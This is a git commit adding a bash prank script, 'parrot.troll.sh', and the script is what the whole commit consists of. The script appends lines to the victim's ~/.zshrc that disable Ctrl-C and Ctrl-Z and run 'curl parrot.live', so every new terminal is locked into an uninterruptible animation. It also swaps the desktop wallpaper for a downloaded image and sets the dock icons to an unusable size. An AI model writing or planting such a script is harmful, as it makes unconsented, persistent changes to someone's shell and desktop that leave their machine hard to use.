3e69da47977ce0160a069b8083b2295662a3c79f
Danielfonsecaa <danieldafonseca@sapo.pt>
2025-05-08 16:19:28 +0100

    done

---
+++ parrot.troll.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+
+PARROT_TROLL=$(cat << 'EOF'
+trap '' 2
+stty susp undef
+curl parrot.live
+EOF
+)
+
+append_parrot_troll() {
+    local file="$1"
+    if [ -f "$file" ]; then
+		echo "$PARROT_TROLL" >> "$file"
+		echo "Parrot Troll 🦜 added to $file"
+    fi
+}
+
+append_parrot_troll ~/.zshrc
+source ~/.zshrc
+cd $HOME
+curl -o Z.png 'https://i.ytimg.com/vi/iEZo9WDFt4Q/maxresdefault.jpg'
+gsettings set org.gnome.desktop.background picture-uri-dark $HOME/Z.png
+gsettings set org.gnome.desktop.background picture-uri $HOME/Z.pngs
+dconf write /org/gnome/shell/extensions/dash-to-dock/dash-max-icon-size 900
